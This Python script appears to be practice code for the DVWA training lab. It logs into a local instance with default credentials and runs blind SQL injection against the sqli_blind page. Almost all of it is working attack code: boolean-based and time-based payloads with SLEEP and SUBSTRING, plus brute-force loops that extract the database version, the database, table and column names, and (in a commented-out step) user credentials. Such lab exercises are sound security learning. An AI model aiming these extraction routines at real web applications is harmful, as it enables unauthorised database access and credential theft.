import requests
import re
import time
import string
import urllib.parse
from tqdm import tqdm
import concurrent.futures

localhost =  "localhost"
DVWA_URL = f"http://{localhost}/DVWA"

THREADS = 10
BATCH_SIZE = 5

alphabet_database_name = string.ascii_letters + string.digits + string.digits + "_"

levels = ["low", "medium", "high", "impossible"]

session = requests.Session()

# Get user_token
login_page = session.get(f"{DVWA_URL}/login.php")
token_match = re.search(r"name='user_token' value='([a-f0-9]+)'", login_page.text)

if not token_match:
    print("[-] Could not find user_token!")
    exit()

user_token = token_match.group(1)

# Send login request with valid token
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": user_token  
}

response = session.post(f"{DVWA_URL}/login.php", data=login_data)

# Check if login was successful
if "You have logged in as 'admin'" in response.text:
    print("[+] Login successful!")
else:
    print("[-] Login failed!")
    exit()

# Set security level
def setup_level(level):
    security_data = {   
        "security": level,
        "seclev_submit": "Submit",
        "user_token": user_token
    }

    response = session.post(f"{DVWA_URL}/security.php", data=security_data)

    # Check if security level was set
    if f"Security level set to {level}" in response.text:
        print(f"[+] Security level set to {level}!")
    else:
        print(f"[-] Could not set security level to {level}!")
        exit()

# Boolean-based SQLi detecing function
def boolean_blind_sqli_test(base_url, brute_data, brute_cookies):
    print("[*] Testing Boolean-based Blind SQL Injection...")

    # payload true
    brute_data['id'] = "1' AND 1=1 -- -"  
    r1 = session.get(f"{base_url}?id={brute_data['id']}&Submit={brute_data['Submit']}", cookies=brute_cookies)

    # payload false
    brute_data['id'] = "1' AND 1=0 -- -"  
    r2 = session.get(f"{base_url}?id={brute_data['id']}&Submit={brute_data['Submit']}", cookies=brute_cookies)

    if "User ID exists in the database." in r1.text and "User ID is MISSING from the database." in r2.text:
        return True
    return False

# Time-based SQLi detecting function
def time_based_sqli_test(base_url, brute_data, brute_cookies):
    print("[*] Testing Time-based Blind SQL Injection...")

    brute_data['id'] = "1' AND SLEEP(5) -- -"  

    start_time = time.time()
    session.get(f"{base_url}?id={brute_data['id']}&Submit={brute_data['Submit']}", cookies=brute_cookies)
    end_time = time.time()

    if end_time - start_time > 4:
        return True
    return False

def time_based_sqli(base_url, brute_data, brute_cookies, payload):
    brute_data['id'] = f"1' {payload} AND SLEEP(3) -- -"  

    start_time = time.time()
    session.get(f"{base_url}?id={brute_data['id']}&Submit={brute_data['Submit']}", cookies=brute_cookies)
    end_time = time.time()

    if end_time - start_time > 2:
        return True
    return False

# Exploit by Time-based SQL Injection
def extract_database_name(base_url, brute_data, brute_cookies):
    database_name = ""
    for i in range(1, 20):
        for char in alphabet_database_name:
            brute_data['id'] = f"1' AND IF(SUBSTRING(database(),{i},1)='{char}', SLEEP(3), 0) -- -"
            
            start_time = time.time()
            session.get(f"{base_url}?id={brute_data['id']}&Submit={brute_data['Submit']}", cookies=brute_cookies)
            end_time = time.time()

            if end_time - start_time > 2:
                database_name += char
                print(f"[>] Found character: {char}")
                break

    print(f"[+] Database name: {database_name}")
    return database_name

def test(base_url, brute_data, brute_cookies):
    brute_data["id"] = "1"
    brute_url = f"{base_url}?id={brute_data['id']}&Submit={brute_data['Submit']}"
    response = session.get(brute_url, cookies=brute_cookies)
    if "User ID exists in the database." in response.text:
        print("[+] Test T completed successfully!")

    brute_data["id"] = "0"
    brute_url = f"{base_url}?id={brute_data['id']}&Submit={brute_data['Submit']}"
    response = session.get(brute_url, cookies=brute_cookies)
    if "User ID is MISSING from the database." in response.text:
        print("[+] Test F completed successfully!")

def time_sqli(base_url, brute_data, brute_cookies, payload):
    brute_data['id'] = f"1' AND IF({payload}, SLEEP(3), 0) -- -"
    start_time = time.time()
    response = session.get(base_url, cookies=brute_cookies, params=brute_data)
    return (time.time() - start_time) > 2 

def extract_data_time(base_url, brute_data, brute_cookies, query, length=20):
    result = ""
    for i in tqdm(range(1, length + 1)):
        for char in alphabet_database_name:  
            payload = f"SUBSTRING(({query}),{i},1)='{char}'"  
            if time_sqli(base_url, brute_data, brute_cookies, payload):  
                result += char
                break 
    return result

def get_all_with_query(base_url, brute_data, brute_cookies, query):
    results = []
    i = 0
    while True:
        result = extract_data_time(base_url, brute_data, brute_cookies, f"({query} LIMIT {i}, 1)", 20)
        if result:
            results.append(result)
        else:
            break
        i += 1
    return results

def extract_credentials(base_url, brute_data, brute_cookies, table_name):
    accounts = {}
    usernames = get_all_with_query(base_url, brute_data, brute_cookies, f"SELECT user FROM {table_name}")
    print(usernames)
    for username in usernames:
        password = extract_data_time(base_url, brute_data, brute_cookies, f"(SELECT password FROM {table_name} WHERE username='{username}')", 32)
        accounts[username] = password
    
    return accounts

def _boolean_blind_sqli(base_url, brute_data, brute_cookies, payload):
    """Executes a Boolean-based SQLi test"""
    brute_data['id'] = f"1' AND {payload}"
    response = session.get(f"{base_url}?id={brute_data['id']}&Submit={brute_data['Submit']}", cookies=brute_cookies)

    if "User ID exists in the database." in response.text:
        return True  # Payload is successful
    elif "User ID is MISSING from the database." in response.text:
        return False  # Payload failed
    return False


def count_tables(base_url, brute_data, brute_cookies, database_name):
    """Count the number of tables in a database"""
    for i in range(1, 50):
        payload = f"0' UNION (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema='{database_name}')={i}"
        if _boolean_blind_sqli(base_url, brute_data, brute_cookies, payload):
            print(f"[+] The number of tables: {i}")
            return i
    return 0

def extract_table_names(base_url, brute_data, brute_cookies, table_count, database_name):
    """Extract table names from the database"""
    tables = []
    alphabet_database_name = string.ascii_lowercase + string.digits + string.punctuation
    for index in range(table_count):
        table_name = ""
        for i in range(1, 32):
            for char in alphabet_database_name:
                payload = f"0' UNION SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{database_name}' LIMIT {index},1),{i},1)='{char}'"
                if _boolean_blind_sqli(base_url, brute_data, brute_cookies, payload):
                    table_name += char
                    print(f"[+] Extracting Table {index+1}: {table_name}", end="\r")
                    break
            else:
                break
        tables.append(table_name)
    return tables

def extract_column_names(base_url, brute_data, brute_cookies, table_name):
    """Extract column names for a given table"""
    columns = []
    for column_index in range(10):  # Column count
        column_name_query = f"(SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {column_index},1)"
        column_name = extract_data_time(base_url, brute_data, brute_cookies, column_name_query, 32)
        if column_name:
            columns.append(column_name)
            print(f"[+] Found Column: {column_name}")
        else:
            print("[!] No more columns found.")
            break
    return columns








def low_level():
    setup_level("low")

    base_url = f"{DVWA_URL}/vulnerabilities/sqli_blind/"
    
    brute_headers = {
        "Referer": f"{DVWA_URL}/security.php",
    }
    brute_data = {
        "id": "0' OR '1'='1",
        "Submit": "Submit"
    }
    brute_cookies = {
        "Cookie": f"PHPSESSID={session.cookies['PHPSESSID']}; security=low",
        "user_token": user_token
    }

    # columns_in_tables = {}

    # scan step
    # database_name = extract_database_name(base_url, brute_data, brute_cookies)
    # database_name = extract_data_time(base_url, brute_data, brute_cookies, "database()")
    # table_names = get_all_with_query(base_url, brute_data, brute_cookies, f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database_name}'")
    # for table_name in table_names:
    #     print(f"[*] Table: {table_name}")
    #     columns = get_all_with_query(base_url, brute_data, brute_cookies, f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'")
    #     columns_in_tables[table_name] = columns
    #     print(f"[>] Columns: {columns}")
    
    # # main core
    # user_info = extract_credentials(base_url, brute_data, brute_cookies, "users")
    # print(user_info)

    # version of SQL database software
    version = extract_data_time(base_url, brute_data, brute_cookies, "SELECT version()", 32)
    print(f"[+] Database version: {version}")

    # Extract database name
    database_name = extract_data_time(base_url, brute_data, brute_cookies, "database()", 16)
    print(f"[+] Database Name: {database_name}")

    # Extract table name
    table_name = extract_data_time(base_url, brute_data, brute_cookies, f"(SELECT table_name FROM information_schema.tables WHERE table_schema='{database_name}' LIMIT 1)", 16)
    print(f"[+] Table Name: {table_name}")





if __name__ == '__main__':
    level = "low"
    low_level()

